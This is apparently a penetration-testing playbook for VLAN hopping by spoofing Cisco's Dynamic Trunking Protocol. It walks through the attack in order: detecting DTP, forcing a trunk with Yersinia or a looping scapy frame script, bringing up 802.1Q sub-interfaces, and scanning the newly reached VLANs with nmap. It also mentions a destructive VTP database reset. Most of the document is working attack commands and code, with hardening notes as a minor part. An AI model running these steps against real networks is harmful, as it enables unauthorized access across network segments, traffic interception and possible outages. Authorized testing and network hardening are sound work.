# VLAN Hopping — DTP / Switch Spoofing

## When this applies

- Target switch port is configured with `switchport mode dynamic auto` or `dynamic desirable` (Cisco defaults on many older deployments).
- Attacker connects directly to that switch port and can send raw L2 frames.
- Goal is to negotiate a trunk link, then receive (and inject) frames in every VLAN allowed on the trunk.

## Technique

Cisco's Dynamic Trunking Protocol (DTP) lets two switches auto-negotiate a trunk. By emitting a DTP frame claiming to be a switch wanting to trunk, an attacker on an access port can convince the upstream switch to convert the link to a trunk. After negotiation, the attacker sees all VLAN traffic via 802.1Q tags and can inject frames into any allowed VLAN.

## Steps

### 1. Confirm DTP is exposed

```bash
# Listen for DTP frames (multicast 01:00:0c:cc:cc:cc, SNAP type 0x2004)
sudo tcpdump -i eth0 -nn -e 'ether host 01:00:0c:cc:cc:cc and ether[16:2]==0x2004'
```

If the upstream switch sends DTP frames to the access port, it's a candidate. Switches with `switchport mode access` and `switchport nonegotiate` won't send DTP — those ports are immune.

### 2. Negotiate trunk via Yersinia

```bash
# Yersinia GUI mode
sudo yersinia -G
# Select DTP → "enabling trunking" attack on the relevant interface
```

Yersinia emits crafted DTP frames marking the link as Desirable / Trunking. After ~60s, the upstream switch converts the link.

### 3. Negotiate trunk via scapy

```python
from scapy.all import *
from scapy.contrib.dtp import DTP, DTPGeneric

# DTP frame announcing trunk-desirable
pkt = (
    Ether(dst="01:00:0c:cc:cc:cc", src=RandMAC())
    / LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
    / SNAP(OUI=0xc, code=0x2004)
    / DTP(
        ver=1,
        tlvlist=[
            DTPDomain(type=0x0001, length=0x0008, domain=b"\x00\x00\x00\x00\x00"),
            DTPStatus(type=0x0002, length=0x0005, status=0x03),       # 0x03 = trunk
            DTPType(type=0x0003, length=0x0005, type_=0xa5),         # 0xa5 = ISL or 0x80=802.1Q
            DTPNeighbor(type=0x0004, length=0x000a, neighbor=RandMAC()),
        ],
    )
)
sendp(pkt, iface="eth0", inter=30, loop=1)
```

Send a DTP frame every ~30s; after the next switch DTP cycle, the link becomes a trunk.

### 4. Bring up trunk-aware interface

After the upstream switch converts the link, configure the local interface for 802.1Q:

```bash
# Linux — add VLAN sub-interfaces
sudo ip link add link eth0 name eth0.10 type vlan id 10
sudo ip link set eth0.10 up
sudo dhclient eth0.10        # request an address in VLAN 10

# Repeat for each interesting VLAN
sudo ip link add link eth0 name eth0.20 type vlan id 20
sudo ip link set eth0.20 up
```

### 5. Enumerate visible VLANs

```bash
# Sniff tagged frames to learn which VLANs are passing
sudo tcpdump -i eth0 -nn -e vlan
```

Or inspect Wireshark for the VLAN tag distribution.

### 6. Pivot into target VLANs

Once VLAN sub-interfaces are up and addressed (DHCP or static), the attacker has a full L3 presence in each VLAN — ARP, scan, exploit normally.

```bash
nmap -sn 10.0.10.0/24 -e eth0.10
nmap -sV --top-ports 50 10.0.10.0/24 -e eth0.10
```

### 7. CDP / VTP spoofing for additional info

While you're already at L2:

```bash
# Yersinia → CDP → "sending CDP packet" — flood CDP messages
# Yersinia → VTP → reset VLAN database (DESTRUCTIVE — never in production)
```

CDP injection can confuse network management tools but is rarely useful offensively. VTP attacks that wipe the VLAN database are out of scope for non-destructive testing.

## Verifying success

- Switchport status changes to `trunk` (verify via SPAN or by observing tagged frames arriving).
- VLAN sub-interfaces obtain DHCP leases or successfully ARP gateway addresses in each VLAN.
- Bidirectional reachability confirmed in non-native VLANs (unlike double-tagging, DTP-spoofed trunking is fully two-way).

## Common pitfalls

- **`switchport mode access` + `switchport nonegotiate`** is the modern default — DTP isn't exchanged, attack fails silently.
- **Hardened deployments** disable DTP at the global level (`no negotiate`) — same outcome.
- **Detection signatures** for unexpected trunk negotiation are common in NDR tools — DTP frames from an "endpoint" are obvious anomalies.
- **Voice VLAN auto-discovery via CDP** is similar but separate; voice phones often inject CDP "I am a phone" frames to get put in the voice VLAN. Tools like `voiphopper` automate this.
- **Native VLAN behavior** on the spoofed trunk: traffic in the access port's old VLAN now appears untagged. Plan VLAN sub-interface addresses accordingly.
- **MAC address learning storms** — yersinia floods can blackhole the segment. Use minimum frame rate.
- **DHCP scopes** in some VLANs are restricted to known MACs — static addressing may be required.

## Tools

- yersinia (interactive L2 protocol attack tool, includes DTP)
- scapy + scapy-contrib (manual DTP crafting)
- vlan / 8021q kernel module (Linux VLAN sub-interfaces)
- VoIPHopper (CDP-based voice-VLAN hopping)
- frogger.py (older VLAN-hopping orchestrator)
- Wireshark / tcpdump (verify trunk negotiation)
